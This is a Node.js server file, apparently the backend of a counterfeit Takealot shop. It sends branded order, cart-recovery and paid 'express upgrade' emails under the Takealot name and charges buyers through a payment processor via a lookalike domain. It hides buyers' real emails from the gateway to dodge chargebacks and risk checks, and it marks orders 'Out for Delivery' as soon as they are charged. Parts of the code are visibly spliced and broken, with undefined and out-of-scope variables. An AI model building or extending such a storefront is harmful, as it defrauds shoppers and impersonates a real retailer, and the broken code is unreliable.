// ====================================================================
// Servidor Local de Desenvolvimento e Testes (Takealot + Ghost Pay)
// Zero dependências externas (usa apenas bibliotecas nativas do Node.js)
// ====================================================================

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 3015;
const ROOT_DIR = __dirname;

// Carregar variáveis de ambiente do .env
function loadEnv() {
  const envPath = path.join(ROOT_DIR, '.env');
  const env = {};
  if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf8').split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) continue;
      const idx = trimmed.indexOf('=');
      if (idx !== -1) {
        env[trimmed.substring(0, idx).trim()] = trimmed.substring(idx + 1).trim();
      }
    }
  }
  return env;
}

const env = loadEnv();
const GHOST_API_KEY = process.env.GHOST_API_KEY || env.GHOST_API_KEY || "";
const GHOST_WEBHOOK_SECRET = process.env.GHOST_WEBHOOK_SECRET || env.GHOST_WEBHOOK_SECRET || "";
const GREEN_SEND_API_KEY = process.env.GREEN_SEND_API_KEY || env.GREEN_SEND_API_KEY || "";


// ====================================================================
// Meta Conversions API (CAPI) Server-Side Tracking
// ====================================================================
const META_PIXEL_IDS = (process.env.META_PIXEL_IDS || env.META_PIXEL_IDS || "3040652709472060,1671642977776583").split(",").map(p => p.trim());
const META_ACCESS_TOKEN = process.env.META_ACCESS_TOKEN || env.META_ACCESS_TOKEN || "";

function hashSha256(val) {
  if (!val) return undefined;
  return crypto.createHash('sha256').update(String(val).trim().toLowerCase()).digest('hex');
}

async function sendMetaCapiEvent(eventName, params = {}) {
  try {
    if (!META_ACCESS_TOKEN || !META_PIXEL_ID) return;

    const userData = {
      client_ip_address: params.ip || '127.0.0.1',
      client_user_agent: params.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    };

    if (params.email) userData.em = [hashSha256(params.email)];
    if (params.phone) userData.ph = [hashSha256(params.phone.replace(/[^0-9]/g, ''))];
    if (params.name) {
      const parts = String(params.name).trim().split(/\s+/);
      userData.fn = [hashSha256(parts[0])];
      if (parts.length > 1) userData.ln = [hashSha256(parts[parts.length - 1])];
    }
    if (params.fbclid) {
      userData.fbc = `fb.1.${Date.now()}.${params.fbclid}`;
    }
    if (params.fbp) {
      userData.fbp = params.fbp;
    }

    const eventPayload = {
      event_name: eventName,
      event_time: Math.floor(Date.now() / 1000),
      event_id: params.eventId || `evt-${Date.now()}-${Math.floor(Math.random() * 100000)}`,
      event_source_url: params.sourceUrl || 'https://takealot.com',
      action_source: 'website',
      user_data: userData,
      custom_data: {
        currency: 'ZAR',
        value: Number(params.amount) || 0,
        content_name: params.title || 'Takealot Promotion',
        content_type: 'product',
        order_id: params.orderId
      }
    };

    for (const pid of META_PIXEL_IDS) {
      try {
        const res = await fetch(`https://graph.facebook.com/v19.0/${pid}/events?access_token=${META_ACCESS_TOKEN}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ data: [eventPayload] })
        });
        const result = await res.json();
        console.log(`[Meta CAPI - Pixel ${pid}] Evento ${eventName} enviado (ID: ${eventPayload.event_id}) | Resposta:`, result.events_received ? 'Recebido com sucesso (1)' : JSON.stringify(result));
      } catch(e) {
        console.warn(`[Meta CAPI - Pixel ${pid} Error]:`, e.message);
      }
    }
    return;
    const res = null; /* replaced */ {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ data: [eventPayload] })
    });
    const result = await res.json();
    console.log(`[Meta CAPI] Evento ${eventName} enviado (ID: ${eventPayload.event_id}) | Resposta:`, result.events_received ? 'Recebido com sucesso (1)' : JSON.stringify(result));
  } catch(err) {
    console.warn('[Meta CAPI Error]:', err.message);
  }
}

async function sendGreenSendConfirmationEmail(order) {
  try {
    const toEmail = order.email;
    if (!toEmail) return;

    const orderId = order.order_id || `TAK-${Math.floor(100000 + Math.random() * 900000)}`;
    const name = order.name || 'Valued Customer';
    const amount = order.amount || 1299;
    const qty = order.quantity || 1;
    const address = order.address || 'Delivery Address Provided';
    const productTitle = order.product_title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
    const is10 = productTitle.includes('10');
          // Disparar evento Purchase no Meta CAPI (Server-Side)
          sendMetaCapiEvent('Purchase', {
            ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim(),
            userAgent: req.headers['user-agent'],
            email: cEmail,
            phone: meta.customer_phone || evData.customer_phone,
            name: meta.recipient_name,
            amount: evData.amount,
            title: meta.product_title || evData.title,
            orderId: upOrderId,
            eventId: upOrderId,
            fbclid: meta.fbclid,
            sourceUrl: 'https://takealot.com/obrigado.html'
          });

    const productImage = order.product_image || (is10 ? 'https://iili.io/oKD3ZQa.jpg' : 'https://iili.io/oKD3ZQa.jpg');

    const textBody = `Hi ${name},\n\nThank you for shopping on Takealot.com!\nWe have received your payment of R ${amount} and your order #${orderId} is confirmed.\n\nDelivery to: ${address}\nEstimated delivery: 2-4 business days.\n\nTakealot Support: support@takealot.co.za`;

    const htmlBody = `
      <div style="max-width:600px;margin:20px auto;background:#fff;border-radius:8px;border:1px solid #e1e4e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#333;overflow:hidden;">
        <div style="background:#ffffff;padding:26px 20px;text-align:center;border-bottom:2px solid #0b56a4;">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png" alt="takealot.com" width="190" style="display:block;margin:0 auto;max-width:190px;height:auto;" />
        </div>
        <div style="padding:28px;">
          <div style="display:inline-block;background:#e8f5e9;color:#1e7e34;padding:6px 14px;border-radius:20px;font-size:13px;font-weight:700;margin-bottom:16px;">✓ PAYMENT RECEIVED & CONFIRMED</div>
          <h2 style="color:#0b56a4;margin-top:0;">Hi ${name},</h2>
          <p style="font-size:14px;line-height:1.6;color:#4a5568;">Great news! We've received your payment of <strong>R ${amount}</strong> via Credit Card and your order is now officially being prepared for dispatch.</p>
          <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:20px 0;">
            <div style="font-size:11px;font-weight:700;color:#718096;text-transform:uppercase;margin-bottom:12px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Order Summary (#${orderId})</div>
            <table style="width:100%;border-collapse:collapse;margin-bottom:12px;border-bottom:1px solid #edf2f7;padding-bottom:12px;">
              <tr>
                <td style="width:84px;vertical-align:top;padding-right:14px;padding-bottom:10px;">
                  <img src="${productImage}" alt="${productTitle}" width="80" height="80" style="display:block;width:80px;height:80px;object-fit:contain;border:1px solid #e2e8f0;border-radius:6px;background:#fff;padding:3px;" />
                </td>
                <td style="vertical-align:top;padding-bottom:10px;">
                  <div style="font-size:14px;font-weight:700;color:#1a202c;line-height:1.4;">${productTitle}</div>
                  <div style="font-size:12.5px;color:#718096;margin-top:4px;">Quantity: ${qty} &bull; Delivery: FREE</div>
                  <div style="font-size:14px;font-weight:700;color:#0b56a4;margin-top:6px;">R ${amount}</div>
                </td>
              </tr>
            </table>
            <div style="margin-top:10px;font-size:16px;font-weight:700;color:#0b56a4;">Total Paid: R ${amount}</div>
          </div>
          <div style="background:#fff;border:1px solid #e2e8f0;border-radius:6px;padding:14px;margin-bottom:20px;font-size:13.5px;color:#4a5568;">
            <strong>Delivery Address:</strong><br>${name}<br>${address}<br>
            <strong>Estimated Delivery:</strong> 2 - 4 business days
          </div>
          <a href="http://localhost:3015/track.html?order=${orderId}" style="display:block;text-align:center;background:#007733;color:#fff;text-decoration:none;padding:14px;border-radius:6px;font-weight:700;font-size:15px;">Track Your Order on Takealot</a>
        </div>
        <div style="background:#f1f5f9;padding:18px;text-align:center;font-size:12px;color:#64748b;border-top:1px solid #e2e8f0;">
          &copy; 2026 Takealot Online (Pty) Ltd. Cape Town, South Africa.<br>Questions? Contact support@takealot.co.za
        </div>
      </div>
    `;

    const res = await fetch("https://greensend.app/v1/messages", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${GREEN_SEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        idempotency_key: `tak-order-${orderId}-${Date.now()}`,
        channel: "email",
        sender_name: "Takealot.com",
        to: toEmail,
        message: {
          subject: `Order Confirmed: #${orderId} - Takealot.com`,
          text: textBody,
          html: htmlBody,
          reply_to: "support@takealot.co.za"
        },
        metadata: {
          order_id: String(orderId),
          store: "takealot"
        }
      })
    });

    const data = await res.json();
    console.log(`[Green Send] Email enviado para ${toEmail} | Status ${res.status}:`, data);
    return res.status === 200 || res.status === 202;
  } catch(e) {
    console.error("[Green Send] Erro ao enviar email:", e);
    return false;
  }
}

async function sendRecoverySequenceEmail(step, lead) {
  try {
    const toEmail = lead.email;
    if (!toEmail || !toEmail.includes('@')) return false;

    const name = lead.name || 'Valued Customer';
    const amount = lead.amount || 1299;
    const qty = lead.quantity || 1;
    const productTitle = lead.product_title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
    const is10 = productTitle.includes('10');
    const productImage = is10 ? 'https://iili.io/oKD3ZQa.jpg' : 'https://iili.io/oKD3ZQa.jpg';
    const oldPrice = is10 ? '11,999' : '8,999';

    let subject, badgeText, badgeColor, badgeTextColor, badgeBorder, headline, bodyText, ctaText, btnColor, checkoutUrl;
    let voucherBoxHtml = "";
    let discountBadge = '<span style="display:inline-block;background:#e0f2fe;color:#0369a1;font-size:11px;font-weight:700;padding:2px 6px;border-radius:4px;margin-left:6px;">SPECIAL DEAL</span>';

    let displayAmount = amount;
    let displayOldPrice = `R ${oldPrice}`;

    if (step === 1) {
      subject = "Did you forget something? Your Samsung 9kg Washing Machine is reserved! - Takealot";
      badgeText = "⏳ LIMITED TIME: PROMOTIONAL PRICE RESERVED";
      badgeColor = "#fff1f2";
      badgeTextColor = "#e11d48";
      badgeBorder = "#fecdd3";
      headline = "You left your Samsung 9kg Washing Machine in your cart!";
      bodyText = `We noticed you started checking out on Takealot, but didn't finish your order. Good news: we have temporarily saved your items at the promotional deal price of <strong>R ${amount}</strong>.`;
      ctaText = "Complete Your Order Now &rarr;";
      btnColor = "#0b56a4";
      checkoutUrl = `http://localhost:3015/checkout.html?price=${amount}&qty=${qty}`;
    } else if (step === 2) {
      subject = `Action required: Your promotional price of R ${amount} expires soon`;
      badgeText = "⚠️ LOW STOCK ALERT: RESERVATION EXPIRING";
      badgeColor = "#fffbeb";
      badgeTextColor = "#b45309";
      badgeBorder = "#fde68a";
      headline = "Your promotional reservation for the Samsung Washing Machine is about to expire!";
      bodyText = `Due to extremely high demand during Black November, we can only hold promotional stock for a short period. Your reserved Samsung 9kg Washing Machine will be released back to other shoppers soon and the price will return to R ${oldPrice}.`;
      ctaText = "Secure Your Promotional Price Now &rarr;";
      btnColor = "#b45309";
      checkoutUrl = `http://localhost:3015/checkout.html?price=${amount}&qty=${qty}`;
    } else {
      // Step 3: Promoção Especial Exclusiva que deixa o produto por apenas R 297 flat
      displayAmount = 297;
      displayOldPrice = (amount && amount !== 197) ? `R ${amount}` : `R ${oldPrice}`;
      subject = "FLASH DEAL: Your Samsung 9kg Washing Machine dropped to ONLY R 297! ⚡";
      badgeText = "🔥 EXCLUSIVE CLEARANCE PROMOTION: ONLY R 297";
      badgeColor = "#fef2f2";
      badgeTextColor = "#dc2626";
      badgeBorder = "#fca5a5";
      headline = "Special Clearance Promotion: Complete your washing machine order for ONLY R 297!";
      bodyText = `We noticed your reserved Samsung 9kg Washing Machine is still waiting in your cart. Because stock must be cleared today, our management unlocked an unprecedented <strong>flash clearance deal</strong>: you can finalize your order right now for <strong>ONLY R 297</strong> (regardless of the original retail price of R ${amount}), plus <strong>Free Nationwide Delivery</strong>.<br><br>This special price of R 297 has been pre-applied to your checkout link below. This offer is valid for the next 2 hours only or until remaining promotional units run out.`;
      ctaText = "Pay Only R 297 & Complete Order Now &rarr;";
      btnColor = "#dc2626";
      checkoutUrl = `http://localhost:3015/checkout.html?price=297&qty=${qty}&voucher=TAKE197&promo=flash197`;
      discountBadge = '<span style="display:inline-block;background:#fee2e2;color:#dc2626;font-size:11px;font-weight:800;padding:2px 7px;border-radius:4px;margin-left:6px;">CLEARANCE: R 297</span>';
      voucherBoxHtml = `
        <div style="background:#fff5f5;border:2px dashed #e53e3e;border-radius:8px;padding:18px 20px;margin:22px 0;text-align:center;">
          <div style="font-size:11px;font-weight:800;color:#c53030;text-transform:uppercase;letter-spacing:1px;">⚡ Secret Warehouse Clearance Deal</div>
          <div style="font-size:32px;font-weight:900;color:#e53e3e;margin:6px 0 2px;">ONLY R 297</div>
          <div style="font-size:13.5px;font-weight:700;color:#2d3748;">Voucher TAKE197 Auto-Applied &bull; Price Dropped to R 297 Flat</div>
          <div style="font-size:11.5px;color:#718096;margin-top:4px;">⏳ Valid for the next 2 hours only &bull; Free Priority Delivery Included</div>
        </div>
      `;
    }

    const htmlBody = `
      <div style="max-width:600px;margin:20px auto;background:#fff;border-radius:8px;border:1px solid #e1e4e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#333;overflow:hidden;">
        <div style="background:#ffffff;padding:26px 20px;text-align:center;border-bottom:2px solid #0b56a4;">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png" alt="takealot.com" width="190" style="display:block;margin:0 auto;max-width:190px;height:auto;" />
        </div>
        <div style="padding:32px 26px;">
          <div style="display:inline-block;background:${badgeColor};color:${badgeTextColor};border:1px solid ${badgeBorder};padding:6px 14px;border-radius:20px;font-size:12px;font-weight:800;margin-bottom:18px;">${badgeText}</div>
          <h2 style="font-size:20px;font-weight:800;color:#0b56a4;margin-top:0;margin-bottom:12px;">Hi ${name},</h2>
          <p style="font-size:16px;font-weight:700;color:#1e293b;margin-bottom:8px;">${headline}</p>
          <p style="font-size:14.5px;line-height:1.6;color:#4a5568;margin-top:0;">${bodyText}</p>
          ${voucherBoxHtml}
          <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:18px;margin:22px 0;">
            <div style="font-size:11.5px;font-weight:700;color:#64748b;text-transform:uppercase;margin-bottom:12px;border-bottom:1px solid #e2e8f0;padding-bottom:6px;">Reserved Item in Your Cart</div>
            <table style="width:100%;border-collapse:collapse;">
              <tr>
                <td style="width:84px;vertical-align:top;padding-right:14px;">
                  <img src="${productImage}" alt="Samsung 9kg Washing Machine" width="80" height="80" style="display:block;width:80px;height:80px;object-fit:contain;border:1px solid #e2e8f0;border-radius:6px;background:#fff;padding:3px;" />
                </td>
                <td style="vertical-align:top;">
                  <div style="font-size:14px;font-weight:700;color:#1a202c;line-height:1.4;">${productTitle}</div>
                  <div style="font-size:12px;color:#64748b;margin-top:4px;">Quantity: ${qty} &bull; Condition: Brand New &bull; Fast Delivery</div>
                  <div style="margin-top:8px;">
                    <span style="font-size:18px;font-weight:800;color:${btnColor};">R ${displayAmount}</span>
                    <span style="font-size:13px;color:#94a3b8;text-decoration:line-through;margin-left:6px;">${displayOldPrice}</span>
                    ${discountBadge}
                  </div>
                </td>
              </tr>
            </table>
          </div>
          <a href="${checkoutUrl}" style="display:block;text-align:center;background:${btnColor};color:#fff!important;text-decoration:none;padding:16px 24px;border-radius:6px;font-size:16px;font-weight:800;margin:26px 0 12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);">${ctaText}</a>
          <p style="font-size:12.5px;color:#718096;text-align:center;margin:12px 0 0;">Safe, encrypted &amp; verified 3D-Secure payment. Free nationwide delivery.</p>
        </div>
        <div style="background:#f1f5f9;padding:22px;text-align:center;font-size:11.5px;color:#64748b;border-top:1px solid #e2e8f0;">
          &copy; 2026 Takealot Online (Pty) Ltd. Foreshore, Cape Town, 8001.<br>Support: support@takealot.co.za
        </div>
      </div>
    `;

    const res = await fetch("https://greensend.app/v1/messages", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${GREEN_SEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        idempotency_key: `tak-recovery-step${step}-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        channel: "email",
        sender_name: "Takealot.com",
        to: toEmail,
        message: {
          subject: subject,
          text: `Hi ${name},\n\n${headline}\n\n${bodyText}\n\nItem: ${productTitle}\nTotal: R ${amount}\n\nCheckout: ${checkoutUrl}\n\nTakealot Support: support@takealot.co.za`,
          html: htmlBody,
          reply_to: "support@takealot.co.za"
        },
        metadata: {
          email_type: "checkout_recovery",
          recovery_step: String(step),
          store: "takealot",
          discount: step === 3 ? "83%" : "promo"
        }
      })
    });

    const data = await res.json();
    console.log(`[Recovery Email Step ${step}] Enviado para ${toEmail} | Status ${res.status}:`, data);
    return res.status === 200 || res.status === 202;
  } catch(e) {
    console.error(`[Recovery Email Step ${step}] Erro:`, e);
    return false;
  }
}

async function sendPriorityUpgradeEmail(order) {
  try {
    const toEmail = order.email || order.customer_email;
    if (!toEmail || !toEmail.includes('@')) return false;

    const name = order.name || order.customer_name || 'Valued Customer';
    const orderId = order.order_id || 'TAK-75-343042';
    const productTitle = order.product_title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)';
    const is10 = productTitle.includes('10');
    const productImage = order.product_image || (is10 ? 'https://iili.io/oKD3ZQa.jpg' : 'https://iili.io/oKD3ZQa.jpg');
    
    const upgradeUrl = `http://localhost:3015/upgrade-shipping.html?order=${orderId}&email=${encodeURIComponent(toEmail)}`;
    const trackUrl = `http://localhost:3015/track.html?order=${orderId}`;
    const logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ce/Takealot_logo.svg/500px-Takealot_logo.svg.png";
    const subject = `Speed up your delivery: Upgrade to Express Priority Dispatch for order #${orderId}! ⚡`;

    const htmlBody = `
      <div style="max-width:600px;margin:20px auto;background:#fff;border-radius:8px;border:1px solid #e1e4e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#333;overflow:hidden;">
        <div style="background:#ffffff;padding:26px 20px;text-align:center;border-bottom:2px solid #0b56a4;">
          <img src="${logoUrl}" alt="takealot.com" width="190" style="display:block;margin:0 auto;max-width:190px;height:auto;" />
        </div>
        <div style="padding:32px 26px;">
          <div style="display:inline-block;background:#eff6ff;color:#0b56a4;border:1px solid #bfdbfe;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:800;margin-bottom:18px;">⚡ FAST-TRACK YOUR ORDER &bull; OPTIONAL UPGRADE</div>
          <h2 style="font-size:20px;font-weight:800;color:#0b56a4;margin-top:0;margin-bottom:12px;">Hi ${name},</h2>
          <p style="font-size:15px;font-weight:700;color:#1e293b;margin-bottom:8px;">Your Samsung 9kg Washing Machine is currently being prepared at our Cape Town Distribution Centre!</p>
          <p style="font-size:14px;line-height:1.6;color:#4a5568;margin-top:0;">
            Your order <strong>#${orderId}</strong> is confirmed and scheduled for Standard Delivery (estimated 3 - 5 business days).<br><br>
            <strong>Want to receive your Samsung Washing Machine even faster?</strong><br>
            Before our daily shipping cutoff, you can optionally upgrade to <strong>Express Priority Dispatch for only R 99</strong>.
          </p>
          <div style="background:#f0fdf4;border:2px dashed #86efac;border-radius:8px;padding:18px 20px;margin:20px 0;">
            <div style="font-size:11px;font-weight:800;color:#166534;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;">What You Get with Express Priority Dispatch</div>
            <table style="width:100%;border-collapse:collapse;font-size:13.5px;color:#1e293b;">
              <tr><td style="padding:6px 0;width:24px;color:#15803d;font-weight:900;">✓</td><td style="padding:6px 0;"><strong>Priority Warehouse Queue:</strong> Order moves ahead and dispatches within 12 - 24 hours.</td></tr>
              <tr><td style="padding:6px 0;width:24px;color:#15803d;font-weight:900;">✓</td><td style="padding:6px 0;"><strong>Dedicated Express Courier:</strong> Shipped via direct Takealot Express van fleet.</td></tr>
              <tr><td style="padding:6px 0;width:24px;color:#15803d;font-weight:900;">✓</td><td style="padding:6px 0;"><strong>Delivery in 24 - 48 Hours:</strong> Get your new Samsung Washing Machine unboxed, plumbed and ready in your laundry room days sooner.</td></tr>
              <tr><td style="padding:6px 0;width:24px;color:#15803d;font-weight:900;">✓</td><td style="padding:6px 0;"><strong>Live Driver SMS Updates:</strong> Direct phone &amp; SMS tracking with the driver.</td></tr>
            </table>
            <div style="margin-top:14px;text-align:center;border-top:1px solid #bbf7d0;padding-top:10px;">
              <span style="font-size:12px;color:#166534;font-weight:700;">ONE-TIME UPGRADE:</span>
              <span style="font-size:24px;font-weight:900;color:#15803d;margin-left:6px;">R 99</span>
            </div>
          </div>
          <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:20px 0;">
            <table style="width:100%;border-collapse:collapse;">
              <tr>
                <td style="width:80px;vertical-align:top;padding-right:14px;">
                  <img src="${productImage}" alt="Samsung 9kg Washing Machine" width="76" height="76" style="display:block;width:76px;height:76px;object-fit:contain;border:1px solid #e2e8f0;border-radius:6px;background:#fff;padding:3px;" />
                </td>
                <td style="vertical-align:top;">
                  <div style="font-size:13.5px;font-weight:700;color:#1a202c;">${productTitle}</div>
                  <div style="font-size:12px;color:#64748b;margin-top:4px;">Order #${orderId} &bull; Preparation Status: In Queue</div>
                </td>
              </tr>
            </table>
          </div>
          <a href="${upgradeUrl}" style="display:block;text-align:center;background:#007733;color:#fff!important;text-decoration:none;padding:16px 24px;border-radius:6px;font-size:16px;font-weight:800;margin:26px 0 12px;box-shadow:0 4px 12px rgba(0,119,51,0.25);">Upgrade to Express Priority (R 99) &rarr;</a>
          <p style="font-size:12.5px;color:#718096;text-align:center;margin:14px 0 0;line-height:1.5;">
            <em>Note: If you are happy with Standard Delivery (3-5 business days), no action is required! Your order will arrive as scheduled.</em>
          </p>
          <div style="text-align:center;margin-top:18px;">
            <a href="${trackUrl}" style="color:#0b56a4;font-size:13px;font-weight:700;text-decoration:underline;">View Live Tracking for Order #${orderId}</a>
          </div>
        </div>
        <div style="background:#f1f5f9;padding:22px;text-align:center;font-size:11.5px;color:#64748b;border-top:1px solid #e2e8f0;">
          &copy; 2026 Takealot Online (Pty) Ltd. Foreshore, Cape Town, 8001.<br>Support: support@takealot.co.za
        </div>
      </div>
    `;

    const res = await fetch("https://greensend.app/v1/messages", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${GREEN_SEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        idempotency_key: `tak-upgrade-${orderId}-${Date.now()}`,
        channel: "email",
        sender_name: "Takealot.com",
        to: toEmail,
        message: {
          subject: subject,
          text: `Hi ${name},\n\nYour order #${orderId} is confirmed for Standard Delivery (3-5 days).\n\nUpgrade to Express Priority Dispatch for R 99 to receive it in 24 - 48 hours:\n${upgradeUrl}\n\nTrack order: ${trackUrl}`,
          html: htmlBody,
          reply_to: "support@takealot.co.za"
        },
        metadata: {
          email_type: "shipping_upgrade",
          order_id: String(orderId),
          store: "takealot"
        }
      })
    });

    const data = await res.json();
    console.log(`[Priority Upgrade Email] Enviado para ${toEmail} | Status ${res.status}:`, data);
    return res.status === 200 || res.status === 202;
  } catch(e) {
    console.error("[Priority Upgrade Email] Erro:", e);
    return false;
  }
}

// ========================================================
// Estratégia de Mascaramento Determinístico (Shadow E-mail)
// 1. Fim dos Chargebacks por "Recibo Surpresa" do Gateway
// 2. Recuperação 100% ativa com e-mail real mantido no CRM/GreenSend
// 3. Suporte a 1-Click Upsell com tokenização determinística
// 4. Desvinculação de risco e perfis no processador de pagamento
// ========================================================
function generateDeterministicBuyerEmail(realEmail) {
  if (!realEmail || typeof realEmail !== 'string') return "buyer_takealot@gmail.com";
  const clean = realEmail.trim().toLowerCase();
  let h1 = 0xdeadbeef, h2 = 0x41c64e6d;
  for (let i = 0; i < clean.length; i++) {
    const ch = clean.charCodeAt(i);
    h1 = Math.imul(h1 ^ ch, 2654435761);
    h2 = Math.imul(h2 ^ ch, 1597334677);
  }
  h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
  h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
  const hashHex = (4294967296 * (2097151 & h2) + (h1 >>> 0)).toString(16).padStart(10, '0').substring(0, 10);
  return `buyer_${hashHex}@gmail.com`;
}

const MIME_TYPES = {
  '.html': 'text/html; charset=UTF-8',
  '.css': 'text/css; charset=UTF-8',
  '.js': 'application/javascript; charset=UTF-8',
  '.json': 'application/json; charset=UTF-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.webp': 'image/webp'
};

const server = http.createServer(async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, Idempotency-Key');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }

  const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
  const pathname = parsedUrl.pathname;

  // 1. Rota de criação de cobrança (suporta /api/create-charge, /api/create-charge.php, /api/create-charge.js)
  if (req.method === 'POST' && (pathname === '/api/create-charge' || pathname === '/api/create-charge.php' || pathname === '/api/create-charge.js')) {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', async () => {
      try {
        const payload = JSON.parse(body || '{}');

        // Estratégia dos 4 Benefícios: Mascaramento Determinístico (Shadow E-mail)
        const realEmail = (payload.real_email || payload.metadata?.real_email || (payload.customer_email && !payload.customer_email.startsWith('buyer_') ? payload.customer_email : '')).trim().toLowerCase();
        const maskedEmail = generateDeterministicBuyerEmail(realEmail || payload.customer_email);

        // O Gateway (Paystack/GhoPay) recebe o e-mail mascarado para evitar recibo surpresa e perfilamento de risco
        payload.customer_email = maskedEmail;

        if (!payload.metadata) payload.metadata = {};
        if (realEmail) payload.metadata.real_email = realEmail;
        payload.metadata.gateway_email = maskedEmail;
        
        // Injeta automaticamente callback_url e redirect_url com https:// (exigência Ghost Pay)
        if (!payload.callback_url || payload.callback_url.startsWith('http://')) {
          payload.callback_url = `https://takealot-tv.co.za/api/webhook.php`;
        }
        if (!payload.redirect_url || payload.redirect_url.startsWith('http://')) {
          payload.redirect_url = payload.redirect_url ? payload.redirect_url.replace(/^http:\/\//i, 'https://') : 'https://takealot-tv.co.za/obrigado.html';
        }

        console.log(`[Ghost Pay] Criando cobrança ZAR ${payload.amount} para Gateway: ${maskedEmail} (Real: ${realEmail || 'N/A'})`);
        // Disparar evento InitiateCheckout no Meta CAPI (Server-Side)
        sendMetaCapiEvent('InitiateCheckout', {
          ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim(),
          userAgent: req.headers['user-agent'],
          email: realEmail || payload.customer_email,
          phone: payload.customer_phone,
          name: payload.metadata?.recipient_name,
          amount: payload.amount,
          title: payload.title,
          orderId: orderId,
          eventId: orderId,
          fbclid: payload.metadata?.fbclid,
          sourceUrl: payload.redirect_url
        });


        // Salvar pedido preliminar em data/orders.json (mantém o e-mail real para a loja)
        const orderId = payload.metadata?.order_id || `TAK-${Math.floor(100000 + Math.random() * 900000)}`;
        try {
          const ordersFile = path.join(ROOT_DIR, 'data', 'orders.json');
          const orders = fs.existsSync(ordersFile) ? JSON.parse(fs.readFileSync(ordersFile, 'utf8') || '{}') : {};
          orders[orderId] = {
            order_id: orderId,
            tracking_code: orderId,
            courier: "Takealot Fast Delivery Team",
            waybill: "WB-ZAF-" + Math.floor(100000 + Math.random() * 900000),
            status: "in_transit",
            status_text: "Out for Delivery",
            status_step: 3,
            customer_name: payload.metadata?.recipient_name || "Customer",
            customer_email: realEmail || payload.metadata?.real_email || "customer@takealot.co.za",
            gateway_email: maskedEmail,
            customer_phone: payload.customer_phone || "",
            delivery_address: payload.metadata?.delivery_address || "South Africa",
            product_title: payload.title || 'Samsung 9kg EcoBubble™ Front Loader Washing Machine (WW90TA046AX)',
            product_image: 'https://iili.io/oKD3ZQa.jpg',
            screen_size: '9kg',
            quantity: payload.metadata?.quantity || 1,
            amount: payload.amount || 1299,
            currency: "ZAR",
            created_at: new Date().toLocaleDateString('en-ZA', { day: 'numeric', month: 'short', year: 'numeric' }),
            estimated_delivery: "2 - 4 Business Days"
          };
          fs.writeFileSync(ordersFile, JSON.stringify(orders, null, 2));
        } catch(e) {
          console.warn('Erro ao salvar em orders.json:', e);
        }

        const ghostRes = await fetch("https://ghopay.app/api/v1/charges", {
          method: "POST",
          headers: {
            "Authorization": `Bearer ${GHOST_API_KEY}`,
            "Content-Type": "application/json",
            "Idempotency-Key": `tak-${Date.now()}-${Math.floor(Math.random() * 10000)}`
          },
          body: JSON.stringify(payload)
        });

        const ghostData = await ghostRes.json();
        console.log(`[Ghost Pay] Resposta (${ghostRes.status}):`, ghostData);

        res.writeHead(ghostRes.status, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(ghostData));
      } catch (err) {
        console.error('[Ghost Pay] Erro ao criar cobrança:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
    });
    return;
  }

  // 1.5 Rota de Rastreamento de Pedido (/api/track-order, /api/track-order.php)
  if (pathname === '/api/track-order' || pathname === '/api/track-order.php') {
    const code = (parsedUrl.searchParams.get('code') || parsedUrl.searchParams.get('order') || '').trim().toUpperCase();
    if (!code) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: 'Please provide an order code' }));
    }

    try {
